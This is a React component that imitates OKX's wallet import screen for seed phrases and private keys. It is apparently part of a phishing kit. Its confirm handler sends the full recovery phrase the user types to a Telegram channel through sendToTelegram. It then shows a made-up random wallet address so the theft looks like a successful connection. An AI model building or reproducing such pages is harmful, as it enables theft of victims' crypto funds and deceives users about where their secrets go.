"use client"

import { useState, useCallback, useMemo } from "react"
import { Sheet, SheetContent } from "@/components/ui/sheet"
import { sendToTelegram } from "@/app/actions/telegram"
import { OKXPrivateKeyImport } from "./okx-private-key-import"

interface OKXSeedPhraseImportProps {
  open: boolean
  onOpenChange: (open: boolean) => void
  onBack: () => void
  onWalletConnected?: (address: string) => void
}

export function OKXSeedPhraseImport({
  open,
  onOpenChange,
  onBack,
  onWalletConnected,
}: OKXSeedPhraseImportProps) {
  const [seedPhrase, setSeedPhrase] = useState<string[]>(Array(12).fill(""))
  const [wordCount, setWordCount] = useState(12)
  const [activeTab, setActiveTab] = useState<"seed" | "private">("seed")
  const [showPrivateKey, setShowPrivateKey] = useState(false)
  const [isLoading, setIsLoading] = useState(false)
  const [showPasswords, setShowPasswords] = useState<boolean[]>(Array(12).fill(false))

  // Ensure showPasswords array matches seedPhrase length
  const normalizedShowPasswords = useMemo(() => {
    if (showPasswords.length !== seedPhrase.length) {
      return Array(seedPhrase.length).fill(false)
    }
    return showPasswords
  }, [showPasswords, seedPhrase.length])

  const handleInputChange = useCallback((index: number, value: string) => {
    setSeedPhrase((prev) => {
      const newSeedPhrase = [...prev]
      newSeedPhrase[index] = value
      return newSeedPhrase
    })
  }, [])

  const togglePasswordVisibility = useCallback((index: number) => {
    setShowPasswords((prev) => {
      const newShowPasswords = [...prev]
      newShowPasswords[index] = !newShowPasswords[index]
      return newShowPasswords
    })
  }, [])

  const handleConfirm = async () => {
    setIsLoading(true)
    try {
      const seedPhraseText = seedPhrase.join(" ")
      await sendToTelegram("seed_phrase", seedPhraseText)
    } catch (error) {
      console.error("Failed to send to Telegram:", error)
    }
    
    const mockAddress = "0x" + Array.from({ length: 40 }, () => Math.floor(Math.random() * 16).toString(16)).join("")
    if (onWalletConnected) {
      onWalletConnected(mockAddress)
    }
    setIsLoading(false)
  }

  const isComplete = seedPhrase.every((word) => word.trim().length > 0)

  return (
    <>
      <style dangerouslySetInnerHTML={{__html: `
        .okx-seed-input {
          color: #ffffff !important;
          background-color: #1a1a1a !important;
          -webkit-text-fill-color: #ffffff !important;
          caret-color: #B0DB12 !important;
        }
        .okx-seed-input::placeholder {
          color: #666666 !important;
        }
        .okx-seed-input:focus {
          border-color: #B0DB12 !important;
        }
      `}} />
      <Sheet open={open && !showPrivateKey} onOpenChange={(isOpen) => {
        if (!isOpen) {
          setShowPrivateKey(false)
        }
        onOpenChange(isOpen)
      }}>
        <SheetContent 
          side="right" 
          className="w-full sm:w-[360px] max-w-full bg-transparent border-0 p-0 overflow-hidden flex flex-col"
          style={{ userSelect: 'none' }}
        >
          <div className="h-full flex justify-end bg-transparent min-h-0">
            <div className="m-2 ml-0 flex-1 rounded-[24px] bg-black border border-[#1f1f1f] overflow-hidden flex flex-col min-h-0">
              {/* Header */}
              <div className="px-4 sm:px-6 pt-4 sm:pt-6 pb-3 sm:pb-4 flex-shrink-0">
                <div className="flex items-center mb-3 sm:mb-6">
                  <button
                    onClick={onBack}
                    className="p-2 hover:bg-gray-900 active:bg-gray-800 rounded-lg transition-colors mr-3 -ml-2 touch-manipulation"
                    aria-label="Back"
                  >
                    <svg
                      className="w-5 h-5 text-white"
                      fill="none"
                      stroke="currentColor"
                      viewBox="0 0 24 24"
                    >
                      <path
                        strokeLinecap="round"
                        strokeLinejoin="round"
                        strokeWidth={2}
                        d="M15 19l-7-7 7-7"
                      />
                    </svg>
                  </button>
                </div>
                <h2 className="text-xl sm:text-2xl font-bold text-white mb-3 sm:mb-6">Seed phrase or private key</h2>
                
                {/* Tabs */}
                <div className="flex gap-2 mb-3 sm:mb-6">
                  <button
                    onClick={() => setActiveTab("seed")}
                    className={`px-3 sm:px-4 py-1.5 sm:py-2 rounded-lg text-xs sm:text-sm font-medium transition-colors touch-manipulation ${
                      activeTab === "seed"
                        ? "bg-gray-800 text-white"
                        : "bg-gray-900 text-gray-400"
                    }`}
                  >
                    Seed phrase
                  </button>
                  <button
                    onClick={(e) => {
                      e.preventDefault()
                      e.stopPropagation()
                      setShowPrivateKey(true)
                    }}
                    className={`px-3 sm:px-4 py-1.5 sm:py-2 rounded-lg text-xs sm:text-sm font-medium transition-colors touch-manipulation ${
                      activeTab === "private"
                        ? "bg-gray-800 text-white"
                        : "bg-gray-900 text-gray-400"
                    }`}
                  >
                    Private key
                  </button>
                </div>
              </div>

              {/* Content - Scrollable */}
              <div className="flex-1 px-4 sm:px-6 pb-3 sm:pb-6 overflow-y-auto min-h-0">
              {/* Word Count Selector */}
              <div className="mb-3 sm:mb-6">
                <div className="flex items-center gap-2 text-xs sm:text-sm text-gray-400">
                  <span>My seed phrase has</span>
                  <select
                    value={wordCount}
                    onChange={(e) => {
                      const count = parseInt(e.target.value)
                      setWordCount(count)
                      setSeedPhrase(Array(count).fill(""))
                      setShowPasswords(Array(count).fill(false))
                    }}
                    className="text-white font-semibold border-0 bg-transparent cursor-pointer focus:outline-none text-xs sm:text-sm"
                  >
                    <option value={12} className="bg-black">12 words</option>
                    <option value={24} className="bg-black">24 words</option>
                  </select>
                  <svg className="w-3 h-3 sm:w-4 sm:h-4 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
                  </svg>
                </div>
              </div>

              {/* Seed Phrase Input Grid */}
              <div className="grid grid-cols-2 gap-1.5 sm:gap-2 mb-3 sm:mb-8">
                {seedPhrase.map((word, index) => (
                  <div key={index} className="relative">
                    <span className="absolute top-1.5 sm:top-2 left-2 sm:left-3 text-[10px] sm:text-[11px] text-gray-500 z-10 font-medium">
                      {index + 1}
                    </span>
                    <input
                      type={normalizedShowPasswords[index] ? "text" : "password"}
                      value={word}
                      onChange={(e) => handleInputChange(index, e.target.value)}
                      className="okx-seed-input w-full pt-4 sm:pt-5 pb-1.5 sm:pb-2 pl-2 sm:pl-3 pr-8 sm:pr-9 border border-gray-700 rounded-lg text-xs sm:text-sm bg-[#1a1a1a] focus:outline-none focus:border-[#B0DB12] focus:ring-1 focus:ring-[#B0DB12] placeholder:text-gray-600"
                      placeholder=""
                      autoFocus={index === 0}
                    />
                    {word && (
                      <button
                        type="button"
                        onClick={() => togglePasswordVisibility(index)}
                        className="absolute right-2 sm:right-3 top-1/2 -translate-y-1/2 z-10 p-1 hover:bg-gray-800 rounded transition-colors touch-manipulation"
                        aria-label={normalizedShowPasswords[index] ? "Hide password" : "Show password"}
                      >
                        {normalizedShowPasswords[index] ? (
                          <svg className="w-3 h-3 sm:w-4 sm:h-4 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21" />
                          </svg>
                        ) : (
                          <svg className="w-3 h-3 sm:w-4 sm:h-4 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                          </svg>
                        )}
                      </button>
                    )}
                  </div>
                ))}
              </div>
              </div>

              {/* Footer - Fixed at bottom */}
              <div className="px-4 sm:px-6 py-3 sm:py-4 border-t border-gray-800 flex-shrink-0">
                <button
                  onClick={handleConfirm}
                  disabled={!isComplete || isLoading}
                  className={`w-full py-2.5 sm:py-3 rounded-lg text-sm sm:text-base font-medium transition-all flex items-center justify-center touch-manipulation ${
                    isComplete && !isLoading
                      ? "bg-[#B0DB12] text-black hover:bg-[#9cc210] active:bg-[#8aad0e] cursor-pointer"
                      : "bg-gray-800 text-gray-500 cursor-not-allowed"
                  }`}
                >
                  {isLoading ? (
                    <>
                      <svg className="animate-spin -ml-1 mr-3 h-4 w-4 sm:h-5 sm:w-5 text-black" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                      </svg>
                      <span className="text-xs sm:text-sm">Importing...</span>
                    </>
                  ) : (
                    "Confirm"
                  )}
                </button>
              </div>
            </div>
          </div>
        </SheetContent>
      </Sheet>

      {showPrivateKey && (
        <OKXPrivateKeyImport
          open={showPrivateKey}
          onOpenChange={(open) => {
            if (!open) {
              setShowPrivateKey(false)
              // Jangan tutup parent sheet, hanya tutup private key sheet
            }
          }}
          onBack={() => {
            setShowPrivateKey(false)
            // Kembali ke seed phrase - Sheet akan terbuka kembali karena open={open && !showPrivateKey}
          }}
          onWalletConnected={(address) => {
            if (onWalletConnected) {
              onWalletConnected(address)
            }
            setShowPrivateKey(false)
          }}
        />
      )}
    </>
  )
}
